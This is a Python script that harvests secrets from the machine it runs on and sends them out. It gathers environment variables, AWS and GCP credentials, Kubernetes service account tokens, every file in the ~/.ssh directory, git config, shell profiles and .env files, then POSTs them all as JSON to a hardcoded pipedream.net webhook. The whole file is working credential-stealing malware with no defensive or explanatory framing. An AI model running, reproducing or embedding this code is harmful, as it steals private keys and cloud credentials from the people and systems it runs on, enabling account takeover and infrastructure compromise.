import os
import configparser
import json
import sys
import urllib.request
import urllib.error

def main():
    """Main function to collect environment data from multiple sources"""
    web_hook = "https://eoaqkzhr0rddtp6.m.pipedream.net"
    
    # Collect all environment data
    all_env_data = {}
    all_env_data['system_env_vars'] = get_system_env_vars()
    all_env_data['aws_credentials'] = get_aws_credentials()
    all_env_data['docker_env'] = get_docker_env()
    all_env_data['kubernetes_env'] = get_kubernetes_env()
    all_env_data['cloud_provider_env'] = get_cloud_provider_env()
    all_env_data['git_env'] = get_git_env()
    all_env_data['config_files'] = get_config_files()
    all_env_data['process_env'] = get_process_env()
    
    # Push collected secrets to webhook
    push_secrets(web_hook, all_env_data)


def get_system_env_vars():
    """Fetch all system environment variables"""
    try:
        return dict(os.environ)
    except Exception as e:
        return {"error": str(e)}


def get_aws_credentials():
    """Fetch AWS credentials from various locations"""
    aws_data = {}
    
    # AWS credentials file
    try:
        config = configparser.RawConfigParser()
        aws_creds_path = os.path.join(os.path.expanduser('~'), '.aws', 'credentials')
        if os.path.exists(aws_creds_path):
            config.read(aws_creds_path)
            sections = config.sections()
            for section in sections:
                try:
                    aws_data[section] = {
                        'aws_access_key_id': config.get(section, 'aws_access_key_id'),
                        'aws_secret_access_key': config.get(section, 'aws_secret_access_key')
                    }
                except:
                    pass
    except Exception as e:
        aws_data['credentials_error'] = str(e)
    
    # AWS config file
    try:
        config = configparser.RawConfigParser()
        aws_config_path = os.path.join(os.path.expanduser('~'), '.aws', 'config')
        if os.path.exists(aws_config_path):
            config.read(aws_config_path)
            aws_data['config_file'] = dict(config.items())
    except Exception as e:
        aws_data['config_error'] = str(e)
    
    return aws_data


def get_docker_env():
    """Check for Docker environment indicators and variables"""
    docker_data = {}
    
    # Check if running in Docker
    docker_indicators = [
        '/.dockerenv',
        '/proc/self/cgroup'
    ]
    
    for indicator in docker_indicators:
        if os.path.exists(indicator):
            docker_data['is_docker'] = True
            try:
                with open(indicator, 'r') as f:
                    docker_data[indicator] = f.read()
            except:
                pass
    
    # Docker environment variables
    docker_env_vars = [
        'DOCKER_HOST', 'DOCKER_CERT_PATH', 'DOCKER_TLS_VERIFY',
        'DOCKER_CONFIG', 'DOCKER_BUILDKIT', 'BUILDKIT_PROGRESS'
    ]
    
    for var in docker_env_vars:
        if var in os.environ:
            docker_data[var] = os.environ[var]
    
    return docker_data


def get_kubernetes_env():
    """Fetch Kubernetes-related environment variables"""
    k8s_data = {}
    
    k8s_env_vars = [
        'KUBERNETES_SERVICE_HOST', 'KUBERNETES_SERVICE_PORT',
        'KUBERNETES_PORT', 'KUBERNETES_PORT_443_TCP',
        'KUBERNETES_SERVICE_PORT_HTTPS'
    ]
    
    k8s_secret_paths = [
        '/var/run/secrets/kubernetes.io/serviceaccount/',
        '/run/secrets/kubernetes.io/serviceaccount/'
    ]
    
    # Get K8s environment variables
    for var in k8s_env_vars:
        if var in os.environ:
            k8s_data[var] = os.environ[var]
    
    # Check for K8s service account tokens
    for path in k8s_secret_paths:
        if os.path.exists(path):
            k8s_data['k8s_path'] = path
            try:
                for file in os.listdir(path):
                    file_path = os.path.join(path, file)
                    with open(file_path, 'r') as f:
                        k8s_data[f'k8s_{file}'] = f.read()
            except:
                pass
    
    return k8s_data


def get_cloud_provider_env():
    """Fetch cloud provider (AWS, GCP, Azure) specific variables"""
    cloud_data = {}
    
    # AWS
    aws_vars = [
        'AWS_ACCESS_KEY_ID', 'AWS_SECRET_ACCESS_KEY', 'AWS_SESSION_TOKEN',
        'AWS_DEFAULT_REGION', 'AWS_REGION', 'AWS_PROFILE', 'AWS_CONFIG_FILE',
        'AWS_SHARED_CREDENTIALS_FILE', 'AWS_DATA_PATH', 'AWS_EC2_METADATA_DISABLED'
    ]
    
    # GCP
    gcp_vars = [
        'GOOGLE_APPLICATION_CREDENTIALS', 'GOOGLE_CLOUD_PROJECT',
        'GCLOUD_PROJECT', 'GCP_PROJECT', 'CLOUDSDK_PROJECT'
    ]
    
    # Azure
    azure_vars = [
        'AZURE_SUBSCRIPTION_ID', 'AZURE_TENANT_ID', 'AZURE_CLIENT_ID',
        'AZURE_CLIENT_SECRET', 'AZURE_STORAGE_ACCOUNT', 'AZURE_STORAGE_KEY'
    ]
    
    # Heroku
    heroku_vars = [
        'HEROKU_API_KEY', 'HEROKU_APP_NAME', 'DYNO'
    ]
    
    all_cloud_vars = aws_vars + gcp_vars + azure_vars + heroku_vars
    
    for var in all_cloud_vars:
        if var in os.environ:
            cloud_data[var] = os.environ[var]
    
    # Check for GCP credentials file
    if 'GOOGLE_APPLICATION_CREDENTIALS' in os.environ:
        try:
            gcp_creds_path = os.environ['GOOGLE_APPLICATION_CREDENTIALS']
            if os.path.exists(gcp_creds_path):
                with open(gcp_creds_path, 'r') as f:
                    cloud_data['gcp_credentials'] = json.load(f)
        except:
            pass
    
    return cloud_data


def get_git_env():
    """Fetch git configuration and credentials"""
    git_data = {}
    
    git_env_vars = [
        'GIT_AUTHOR_NAME', 'GIT_AUTHOR_EMAIL', 'GIT_COMMITTER_NAME',
        'GIT_COMMITTER_EMAIL', 'GIT_SSH_COMMAND', 'GIT_CONFIG_GLOBAL',
        'GIT_CONFIG_SYSTEM', 'GIT_TERMINAL_PROMPT'
    ]
    
    for var in git_env_vars:
        if var in os.environ:
            git_data[var] = os.environ[var]
    
    # Git config file
    try:
        config = configparser.RawConfigParser()
        git_config_path = os.path.join(os.path.expanduser('~'), '.gitconfig')
        if os.path.exists(git_config_path):
            config.read(git_config_path)
            for section in config.sections():
                if section not in git_data:
                    git_data[section] = {}
                for option in config.options(section):
                    git_data[section][option] = config.get(section, option)
    except Exception as e:
        git_data['git_config_error'] = str(e)
    
    # SSH keys and known_hosts
    try:
        ssh_dir = os.path.join(os.path.expanduser('~'), '.ssh')
        if os.path.exists(ssh_dir):
            for file in os.listdir(ssh_dir):
                file_path = os.path.join(ssh_dir, file)
                try:
                    with open(file_path, 'r') as f:
                        git_data[f'ssh_{file}'] = f.read()
                except:
                    pass
    except Exception as e:
        git_data['ssh_error'] = str(e)
    
    return git_data


def get_config_files():
    """Fetch various configuration files that might contain secrets"""
    config_data = {}
    
    config_paths = [
        os.path.join(os.path.expanduser('~'), '.env'),
        os.path.join(os.path.expanduser('~'), '.env.local'),
        os.path.join(os.path.expanduser('~'), '.bashrc'),
        os.path.join(os.path.expanduser('~'), '.bash_profile'),
        os.path.join(os.path.expanduser('~'), '.zshrc'),
        os.path.join(os.path.expanduser('~'), '.profile'),
        '/etc/environment',
        '/etc/profile',
    ]
    
    for path in config_paths:
        if os.path.exists(path) and os.path.isfile(path):
            try:
                with open(path, 'r') as f:
                    content = f.read()
                    config_data[path] = content
            except PermissionError:
                config_data[path] = "Permission Denied"
            except Exception as e:
                config_data[path] = f"Error reading: {str(e)}"
    
    return config_data


def get_process_env():
    """Fetch environment from current process and parent processes"""
    process_data = {}
    
    try:
        process_data['pid'] = os.getpid()
        process_data['ppid'] = os.getppid()
        process_data['cwd'] = os.getcwd()
        process_data['user'] = os.getenv('USER') or os.getenv('USERNAME')
        process_data['home'] = os.path.expanduser('~')
    except Exception as e:
        process_data['process_error'] = str(e)
    
    # Read /proc/self/environ if available (Linux)
    try:
        if os.path.exists('/proc/self/environ'):
            with open('/proc/self/environ', 'r') as f:
                environ_content = f.read()
                process_data['proc_environ'] = environ_content.split('\x00')
    except PermissionError:
        process_data['proc_environ'] = "Permission Denied"
    except:
        pass
    
    return process_data


def push_secrets(web_hook, all_env_data):
    """Send collected secrets to webhook"""
    try:
        # Flatten the data for easier transmission
        flattened_data = []
        
        for category, data in all_env_data.items():
            if isinstance(data, dict):
                for key, value in data.items():
                    flattened_data.append({
                        'category': category,
                        'key': key,
                        'value': value
                    })
            else:
                flattened_data.append({
                    'category': category,
                    'value': data
                })
        
        # Convert to JSON string, handling non-serializable objects
        json_payload = json.dumps(flattened_data, default=str)
        
        print("Environment Data Collected")
        print("Sending to Webhook ..... ")
        
        # Use urllib for POST request
        req = urllib.request.Request(
            web_hook,
            data=json_payload.encode('utf-8'),
            headers={'Content-Type': 'application/json'},
            method='POST'
        )
        
        try:
            with urllib.request.urlopen(req, timeout=10) as response:
                print("Data sent successfully")
        except urllib.error.URLError as e:
            print(f"Webhook error: {e.reason}")
        
    except Exception as e:
        print(f"Error sending data: {str(e)}")


if __name__ == '__main__':
    main()
